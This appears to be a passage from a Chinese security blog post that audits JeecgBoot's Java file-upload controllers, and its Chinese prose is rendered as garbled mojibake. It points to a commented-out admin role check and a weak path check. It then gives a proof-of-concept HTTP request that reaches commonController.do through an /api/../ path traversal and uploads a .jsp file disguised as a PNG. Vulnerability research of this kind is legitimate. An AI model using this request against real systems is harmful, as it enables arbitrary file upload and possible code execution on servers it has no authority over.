</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Result</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Result</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">ossFileService</span><span class="p">.</span><span class="na">upload</span><span class="p">(</span><span class="n">multipartFile</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">result</span><span class="p">.</span><span class="na">success</span><span class="p">(</span><span class="s">&#34;ä¸Šä¼ æˆåŠŸï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">log</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="na">getMessage</span><span class="p">(),</span><span class="w"> </span><span class="n">ex</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">result</span><span class="p">.</span><span class="na">error500</span><span class="p">(</span><span class="s">&#34;ä¸Šä¼ å¤±è´¥&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®çœ‹å‡ºæ¥è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œè¿™ä¸ªè¢«æ³¨é‡Šæ‰åº”è¯¥æ˜¯åé¢åŠ çš„<code>@RequiresRoles(&quot;admin&quot;)</code>ï¼Œå¾ˆå¤šå‰é¢çš„ä¸œè¥¿éƒ½éœ€è¦åŠ è¿™ä¸ªä¸œè¥¿ï¼Œå¯èƒ½æ˜¯ä¸ºäº†ä½¿ç”¨æ–¹ä¾¿ä¸ï¼Œå…ˆä¸ç®¡é‚£ä¹ˆå¤šäº†ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å•Šï¼Œå°±æ˜¯ä¸€ä¸ªç›´æ¥çš„ä¸Šä¼ ï¼Œå•¥ä¸œè¥¿éƒ½æ²¡è¿‡æ»¤ï¼Œå¾€é‡Œé¢çœ‹çœ‹ã€‚
é‡Œé¢ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿äº†ï¼Œå¥½åƒæ˜¯åˆä¿®æ‰äº†ï¼Œæ­£å¸¸è¿™é‡Œåº”è¯¥æ˜¯æ¼æ´ç‚¹äº†ã€‚å¤šçš„å°±å…ˆä¸ç®¡äº†ã€‚</p>
<h2 id="commoncontrollerdo">commonController.do
</h2><p>è¿™é‡Œä¹Ÿæœ‰ä¸ªè¶Šæƒçš„æ–‡ä»¶ä¸Šä¼ ï¼Œè™½ç„¶è¶Šæƒä¸æ˜¯ä»–çš„é—®é¢˜ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/upload&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">upload</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Result</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">savePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">bizPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;biz&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//LOWCOD-2580 sys/common/uploadæ¥å£å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isNotEmpty</span><span class="p">(</span><span class="n">bizPath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">bizPath</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">SymbolConstant</span><span class="p">.</span><span class="na">SPOT_SINGLE_SLASH</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">bizPath</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">SymbolConstant</span><span class="p">.</span><span class="na">SPOT_DOUBLE_BACKSLASH</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JeecgBootException</span><span class="p">(</span><span class="s">&#34;ä¸Šä¼ ç›®å½•bizPathï¼Œæ ¼å¼éæ³•ï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">MultipartHttpServletRequest</span><span class="w"> </span><span class="n">multipartRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">MultipartHttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// è·å–ä¸Šä¼ æ–‡ä»¶å¯¹è±¡  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">MultipartFile</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">multipartRequest</span><span class="p">.</span><span class="na">getFile</span><span class="p">(</span><span class="s">&#34;file&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">bizPath</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">CommonConstant</span><span class="p">.</span><span class="na">UPLOAD_TYPE_OSS</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">uploadType</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//æœªæŒ‡å®šç›®å½•ï¼Œåˆ™ç”¨é˜¿é‡Œäº‘é»˜è®¤ç›®å½• upload            bizPath = &#34;upload&#34;;  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//result.setMessage(&#34;ä½¿ç”¨é˜¿é‡Œäº‘æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¿…é¡»æ·»åŠ ç›®å½•ï¼&#34;);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//result.setSuccess(false);            //return result;        }else{  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bizPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">CommonConstant</span><span class="p">.</span><span class="na">UPLOAD_TYPE_LOCAL</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">uploadType</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//update-begin-author:lvdandan date:20200928 for:ä¿®æ”¹JEditorç¼–è¾‘å™¨æœ¬åœ°ä¸Šä¼   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">savePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">uploadLocal</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="n">bizPath</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//update-begin-author:lvdandan date:20200928 for:ä¿®æ”¹JEditorç¼–è¾‘å™¨æœ¬åœ°ä¸Šä¼   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="cm">/**  å¯Œæ–‡æœ¬ç¼–è¾‘å™¨åŠmarkdownæœ¬åœ°ä¸Šä¼ æ—¶ï¼Œé‡‡ç”¨è¿”å›é“¾æ¥æ–¹å¼  
</span></span></span><span class="line"><span class="cl"><span class="cm">        //é’ˆå¯¹jeditorç¼–è¾‘å™¨å¦‚ä½•ä½¿ lcaolæ¨¡å¼ï¼Œé‡‡ç”¨ base64æ ¼å¼å­˜å‚¨  
</span></span></span><span class="line"><span class="cl"><span class="cm">        String jeditor = request.getParameter(&#34;jeditor&#34;);  
</span></span></span><span class="line"><span class="cl"><span class="cm">        if(oConvertUtils.isNotEmpty(jeditor)){            result.setMessage(CommonConstant.UPLOAD_TYPE_LOCAL);            result.setSuccess(true);            return result;        }else{            savePath = this.uploadLocal(file,bizPath);        }        */</span><span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//update-begin-author:taoyan date:20200814 for:æ–‡ä»¶ä¸Šä¼ æ”¹é€   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">savePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CommonUtils</span><span class="p">.</span><span class="na">upload</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">bizPath</span><span class="p">,</span><span class="w"> </span><span class="n">uploadType</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//update-end-author:taoyan date:20200814 for:æ–‡ä»¶ä¸Šä¼ æ”¹é€   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isNotEmpty</span><span class="p">(</span><span class="n">savePath</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="n">savePath</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="na">setMessage</span><span class="p">(</span><span class="s">&#34;ä¸Šä¼ å¤±è´¥ï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œéå¸¸ç®€å•çš„éªŒè¯äº†ä¸€ä¸‹è·¯å¾„ï¼Œä½†æ˜¯ä»€ä¹ˆç”¨éƒ½æ²¡æœ‰èµ·åˆ°ï¼Œç»“åˆ/apiçš„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œç›´æ¥å°±èƒ½è®¿é—®åˆ°è¿™ä¸ªæ¥å£ã€‚<code>/jeecg-boot/api/../commonController.do?parserXml</code>ï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°åé¢çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œå¯ä»¥å‘ç°ï¼Œä»€ä¹ˆæ–‡ä»¶éƒ½å¯ä»¥ä¸Šä¼ ï¼Œéšä¾¿å°±å¯ä»¥æ‰“è¿›å»ï¼Œä¸ç®¡æ˜¯jspè¿˜æ˜¯ä»€ä¹ˆåˆ«çš„ä¸œè¥¿ã€‚
ç»™ä¸ªpocå§ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1  
</span></span><span class="line"><span class="cl">Host:  
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate  
</span></span><span class="line"><span class="cl">Content-Length: 360  
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95  
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei  
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundarygcflwtei  
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; &#34;name=&#34;name&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">zW9YCa.png  
</span></span><span class="line"><span class="cl">------WebKitFormBoundarygcflwtei  
</span></span><span class="line"><span class="cl">ontent-Disposition: form-data; name=&#34;documentTitle&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">blank  
</span></span><span class="line"><span class="cl">------WebKitFormBoundarygcflwtei  
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;zW9YCa.jsp&#34;  
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">11111  
</span></span><span class="line"><span class="cl">------WebKitFormBoundarygcflwtei--
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2026 xxxx
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.33.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >
    

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
